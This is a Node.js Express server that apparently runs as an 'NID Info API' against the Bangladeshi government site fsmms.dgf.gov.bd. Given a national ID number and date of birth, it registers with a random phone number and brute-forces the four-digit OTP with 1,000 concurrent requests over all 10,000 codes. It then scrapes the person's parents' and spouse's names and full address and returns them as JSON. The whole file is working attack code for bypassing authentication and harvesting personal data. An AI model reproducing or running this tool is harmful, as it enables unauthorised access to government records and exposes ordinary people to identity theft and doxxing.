const express = require('express');
const axios = require('axios');
const cors = require('cors');

const app = express();
const PORT = process.env.PORT || 3000;

// Middleware
app.use(cors());
app.use(express.json());

// Configuration
const MOBILE_PREFIX = "019";
const MAX_CONCURRENT = 1000; // আল্ট্রা ফাস্ট concurrency
const TARGET_LOCATION = "http://fsmms.dgf.gov.bd/bn/step2/movementContractor/form";

const BASE_HEADERS = {
    'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Mobile Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'Accept-Encoding': 'gzip, deflate, br, zstd',
    'Cache-Control': 'max-age=0',
    'sec-ch-ua': '"Google Chrome";v="141", "Not?A_Brand";v="8", "Chromium";v="141"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'Origin': 'https://fsmms.dgf.gov.bd',
    'Upgrade-Insecure-Requests': '1',
    'Sec-Fetch-Site': 'same-origin',
    'Sec-Fetch-Mode': 'navigate',
    'Sec-Fetch-User': '?1',
    'Sec-Fetch-Dest': 'document',
    'Accept-Language': 'en-US,en;q=0.9',
};

// Helpers
function randomMobile(prefix) {
    return prefix + Math.random().toString().slice(2, 10);
}

function randomPassword() {
    const uppercase = String.fromCharCode(65 + Math.floor(Math.random() * 26));
    const chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
    let randomChars = '';
    for (let i = 0; i < 8; i++) randomChars += chars.charAt(Math.floor(Math.random() * chars.length));
    return "#" + uppercase + randomChars;
}

function generateOTPRange() {
    return Array.from({ length: 10000 }, (_, i) => i.toString().padStart(4, '0'));
}

// Session creation
async function getSessionAndBypass(nid, dob, mobile, password) {
    const url = 'https://fsmms.dgf.gov.bd/bn/step2/movementContractor';
    const headers = { ...BASE_HEADERS, 'Content-Type': 'application/x-www-form-urlencoded', 'Referer': 'https://fsmms.dgf.gov.bd/bn/step1/movementContractor' };
    const data = { nidNumber: nid, email: "", mobileNo: mobile, dateOfBirth: dob, password, confirm_password: password, next1: "" };

    const res = await axios.post(url, data, { maxRedirects: 0, validateStatus: null, headers });
    if (res.status === 302 && res.headers.location.includes('mov-verification')) {
        const cookies = res.headers['set-cookie'] || [];
        return { session: axios.create({ headers: { ...BASE_HEADERS, 'Cookie': cookies.join('; ') } }), cookies };
    }
    throw new Error('Bypass Failed - Check NID and DOB');
}

// Ultra-fast OTP check with concurrency control
async function tryBatch(session, cookies, otpRange) {
    let found = null;
    const queue = [...otpRange];

    // Shuffle OTPs for randomness
    for (let i = queue.length - 1; i > 0; i--) {
        const j = Math.floor(Math.random() * (i + 1));
        [queue[i], queue[j]] = [queue[j], queue[i]];
    }

    // Worker function
    const worker = async () => {
        while (queue.length > 0 && !found) {
            const otp = queue.pop();
            try {
                const url = 'https://fsmms.dgf.gov.bd/bn/step2/movementContractor/mov-otp-step';
                const headers = { ...BASE_HEADERS, 'Content-Type': 'application/x-www-form-urlencoded', 'Cookie': cookies.join('; '), 'Referer': 'https://fsmms.dgf.gov.bd/bn/step1/mov-verification' };
                const data = { otpDigit1: otp[0], otpDigit2: otp[1], otpDigit3: otp[2], otpDigit4: otp[3] };
                const res = await session.post(url, data, { maxRedirects: 0, validateStatus: null, headers });
                if (res.status === 302 && res.headers.location.includes(TARGET_LOCATION)) {
                    found = otp;
                    break;
                }
            } catch {}
        }
    };

    // Start MAX_CONCURRENT workers
    const workers = Array.from({ length: MAX_CONCURRENT }, () => worker());
    await Promise.all(workers);

    return found;
}

// Fetch form data
async function fetchFormData(session, cookies) {
    const url = 'https://fsmms.dgf.gov.bd/bn/step2/movementContractor/form';
    const headers = { ...BASE_HEADERS, 'Cookie': cookies.join('; '), 'Sec-Fetch-Site': 'cross-site', 'Referer': 'https://fsmms.dgf.gov.bd/bn/step1/mov-verification' };
    const res = await session.get(url, { headers });
    return res.data;
}

// Extract fields
function extractFields(html, ids) {
    const result = {};
    ids.forEach(id => {
        const match = html.match(new RegExp(`<input[^>]*id="${id}"[^>]*value="([^"]*)"`, 'i'));
        result[id] = match ? match[1] : "";
    });
    return result;
}

// Enrich data
function enrichData(contractor_name, result, nid, dob) {
    const mapped = {
        nameBangla: contractor_name,
        nationalId: nid,
        dateOfBirth: dob,
        fatherName: result.fatherName || "",
        motherName: result.motherName || "",
        spouseName: result.spouseName || "",
        birthPlace: result.nidPerDistrict || "",
        nationality: result.nationality || "",
        division: result.nidPerDivision || "",
        district: result.nidPerDistrict || "",
        upazila: result.nidPerUpazila || "",
        union: result.nidPerUnion || "",
        village: result.nidPerVillage || "",
        ward: result.nidPerWard || "",
        zip_code: result.nidPerZipCode || "",
        post_office: result.nidPerPostOffice || ""
    };
    const addr_parts = [
        `বাসা/হোল্ডিং: ${result.nidPerHolding || '-'}`,
        `গ্রাম/রাস্তা: ${result.nidPerVillage || ''}`,
        `মৌজা/মহল্লা: ${result.nidPerMouza || ''}`,
        `ইউনিয়ন ওয়ার্ড: ${result.nidPerUnion || ''}`,
        `ডাকঘর: ${result.nidPerPostOffice || ''} - ${result.nidPerZipCode || ''}`,
        `উপজেলা: ${result.nidPerUpazila || ''}`,
        `জেলা: ${result.nidPerDistrict || ''}`,
        `বিভাগ: ${result.nidPerDivision || ''}`
    ];
    const filtered = addr_parts.filter(p => p.split(": ")[1] && p.split(": ")[1].trim() && p.split(": ")[1] !== "-");
    mapped.permanentAddress = filtered.join(", ");
    mapped.presentAddress = filtered.join(", ");
    return mapped;
}

// API Routes
app.get('/', (req, res) => {
    res.json({
        message: 'Enhanced NID Info API is running',
        status: 'active',
        endpoints: { getInfo: '/get-info?nid=YOUR_NID&dob=YYYY-MM-DD' },
        features: { enhancedHeaders: true, concurrentOTP: true, improvedPasswordGeneration: true, mobilePrefix: MOBILE_PREFIX }
    });
});

app.get('/get-info', async(req, res) => {
    try {
        const { nid, dob } = req.query;
        if (!nid || !dob) return res.status(400).json({ error: 'NID and DOB are required' });

        const password = randomPassword();
        const mobile = randomMobile(MOBILE_PREFIX);
        const { session, cookies } = await getSessionAndBypass(nid, dob, mobile, password);

        const otpRange = generateOTPRange();
        const foundOTP = await tryBatch(session, cookies, otpRange);
        if (!foundOTP) return res.status(404).json({ success: false, error: "OTP not found" });

        const html = await fetchFormData(session, cookies);
        const ids = ["contractorName","fatherName","motherName","spouseName","nidPerDivision","nidPerDistrict","nidPerUpazila","nidPerUnion","nidPerVillage","nidPerWard","nidPerZipCode","nidPerPostOffice","nidPerHolding","nidPerMouza"];
        const extracted = extractFields(html, ids);
        const finalData = enrichData(extracted.contractorName || "", extracted, nid, dob);

        res.json({ success: true, data: finalData, sessionInfo: { mobileUsed: mobile, otpFound: foundOTP } });

    } catch (err) {
        res.status(500).json({ success: false, error: err.message });
    }
});

app.get('/health', (req, res) => res.json({ status: 'OK', timestamp: new Date().toISOString(), service: 'Enhanced NID Info API', version: '2.0.4' }));

app.get('/test-creds', (req, res) => res.json({ mobile: randomMobile(MOBILE_PREFIX), password: randomPassword(), note: 'Random test credentials' }));

app.listen(PORT, () => console.log(`🚀 API running on port ${PORT}`));
